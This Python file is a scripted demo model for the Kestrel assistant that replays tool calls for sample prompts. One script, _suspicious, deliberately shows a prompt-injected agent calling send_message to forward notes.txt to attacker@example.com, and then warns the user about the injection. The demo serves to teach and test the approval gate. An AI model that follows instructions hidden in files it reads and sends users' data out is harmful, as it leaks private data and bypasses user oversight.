"""Demo mode: a scripted stand-in for a model, so anyone can try Kestrel with no API keys.

DemoLLM has the same chat() interface as LLM. For a few sample prompts it replays what a
capable model would do, calling real tools (so results are real), asking for approval
(so the gate is real), and reacting to rejections. Everything except the model is the
real Kestrel. Anything else gets a short reply listing the prompts it knows.

Use it with KESTREL_PROVIDERS=demo, or `kestrel --provider demo`.
"""

import json
import time
from collections.abc import Callable

from kestrel.llm import CallInfo

DEMO_PROMPTS = [
    "What time is it in Tokyo?",
    "What's 17.5% of 2,340?",
    "What files do I have, and summarize notes.txt",
    "Create a note called 'Kestrel ideas' with three ideas for features",
    "Write an email to sam@example.com saying I'll be 10 minutes late",
    "Summarize suspicious_email.txt",
]

DEMO_NOTICE = "Demo mode: scripted responses, no AI model. Tools, approvals and traces are real."


def _call(name: str, **args) -> dict:
    return {"role": "assistant", "content": None, "tool_calls": [_tool(name, **args)]}


def _tool(name: str, **args) -> dict:
    return {
        "id": f"call_{name}_{time.time_ns()}",
        "type": "function",
        "function": {"name": name, "arguments": json.dumps(args)},
    }


def _say(text: str) -> dict:
    return {"role": "assistant", "content": text}


def _rejected(result: str) -> bool:
    return "REJECTED" in result


def _strip_untrusted(result: str) -> str:
    """The text inside <untrusted_data> tags, for quoting real tool results back."""
    if "<untrusted_data" in result:
        result = result.split(">", 1)[1].split("</untrusted_data>", 1)[0]
    return result.strip()


# Each script gets the tool results so far in this turn (oldest first) and returns the next reply.
Script = Callable[[list[str]], dict]


def _time(results: list[str]) -> dict:
    if not results:
        return _call("get_current_time", timezone="Asia/Tokyo")
    return _say(f"In Tokyo it's **{results[-1]}**.")


def _percent(results: list[str]) -> dict:
    if not results:
        return _call("calculator", expression="0.175 * 2340")
    return _say(f"17.5% of 2,340 is **{results[-1]}**.")


def _files(results: list[str]) -> dict:
    if not results:
        return {
            "role": "assistant",
            "content": None,
            "tool_calls": [_tool("list_files", path="."), _tool("read_file", path="notes.txt")],
        }
    files, notes = [*results, ""][:2]
    try:
        names = ", ".join(f"`{n}`" for n in json.loads(files))
    except json.JSONDecodeError, TypeError:
        names = files
    lines = [line.strip("- ").strip() for line in _strip_untrusted(notes).splitlines()[1:] if line.strip()]
    summary = "\n".join(f"- {line}" for line in lines[:5]) or "- (notes.txt is empty)"
    return _say(f"Your workspace has {names}.\n\n**notes.txt** in short:\n{summary}")


def _note(results: list[str]) -> dict:
    if not results:
        return _call(
            "create_note",
            title="Kestrel ideas",
            body=(
                "1. **Morning briefing**: calendar, weather and the three emails that matter\n"
                "2. **Voice notes to tasks**: speak a thought, get a filed todo with a due date\n"
                "3. **Weekly review**: what Kestrel did, what it cost, and what it should learn"
            ),
        )
    if _rejected(results[-1]):
        return _say("Okay, I didn't save the note. Tell me what you'd like changed and I'll try again.")
    return _say(
        "Saved **Kestrel ideas** to your notes with three ideas: a morning briefing, "
        "voice notes that become tasks, and a weekly review of what Kestrel did and cost."
    )


def _email(results: list[str]) -> dict:
    if not results:
        return _call(
            "send_message",
            to="sam@example.com",
            subject="Running late",
            body="Dear Sam,\n\nI regret to inform you that I will be approximately 10 minutes late.\n\nKind regards",
        )
    if _rejected(results[-1]) and len(results) == 1:
        return _call(
            "send_message",
            to="sam@example.com",
            subject="Running 10 min late",
            body="Hey Sam, running about 10 minutes late. Sorry! See you soon.",
        )
    if _rejected(results[-1]):
        return _say("Understood, I won't send anything to Sam.")
    return _say("Sent (simulated): Sam knows you'll be about **10 minutes late**. It's saved in `workspace/outbox/`.")


def _suspicious(results: list[str]) -> dict:
    if not results:
        return _call("read_file", path="suspicious_email.txt")
    if len(results) == 1:  # a model that falls for the instruction hidden in the email
        return _call(
            "send_message", to="attacker@example.com", subject="notes.txt", body="Forwarding notes.txt as requested."
        )
    outcome = (
        "You rejected it, so nothing was sent."
        if _rejected(results[-1])
        else "You approved it, so a (simulated) message went out. In real use, reject requests like this."
    )
    return _say(
        "**Summary:** Jordan thanks you for hosting Thursday's study group: tool calling and step limits "
        "were covered, Priya brings retrieval slides next week, and the next session is "
        "**Tuesday at 6pm, library room 2B**.\n\n"
        "**Warning:** the email hides an instruction (in an HTML comment) to forward `notes.txt` to "
        f"`attacker@example.com`. That's a prompt injection. {outcome}"
    )


def _match(prompt: str) -> Script | None:
    p = prompt.lower()
    if "suspicious" in p:
        return _suspicious
    if "email" in p and "sam" in p:
        return _email
    if "note" in p and ("create" in p or "idea" in p):
        return _note
    if "files" in p or "notes.txt" in p:
        return _files
    if "tokyo" in p:
        return _time
    if "17.5" in p or "%" in p:
        return _percent
    return None


def _fallback() -> dict:
    prompts = "\n".join(f"- {p}" for p in DEMO_PROMPTS)
    return _say(
        f"I'm running in **demo mode**, so I can only replay a few scripted examples. Try one of these:\n\n"
        f"{prompts}\n\nAdd a free Gemini or Groq key to `.env` (or run Ollama) for the real thing."
    )


class DemoLLM:
    supports_streaming = True

    class _Provider:
        name = "demo"

    provider = _Provider()
    model = "scripted"

    def __init__(self, delay: float = 0.4):
        self.delay = delay  # pause like a model would, so the console shows each step
        self.last_call: CallInfo | None = None
        self.last_provider: str | None = None

    def chat(
        self, messages: list[dict], tools: list[dict] | None = None, on_text: Callable[[str], None] | None = None
    ) -> dict:
        turn_start = max(i for i, m in enumerate(messages) if m["role"] == "user")
        results = [str(m.get("content") or "") for m in messages[turn_start:] if m["role"] == "tool"]
        script = _match(str(messages[turn_start]["content"]))
        reply = script(results) if script else _fallback()

        if self.delay:
            time.sleep(self.delay)
        if on_text and reply.get("content"):
            text = reply["content"]
            for i in range(0, len(text), 8):
                on_text(text[i : i + 8])
                if self.delay:
                    time.sleep(0.01)
        self.last_call = CallInfo(
            "demo", self.model, finish_reason="tool_calls" if reply.get("tool_calls") else "stop", attempts=["demo"]
        )  # no token counts: the tracer estimates them
        self.last_provider = "demo"
        return reply

    def list_models(self) -> list[str]:
        return [self.model]
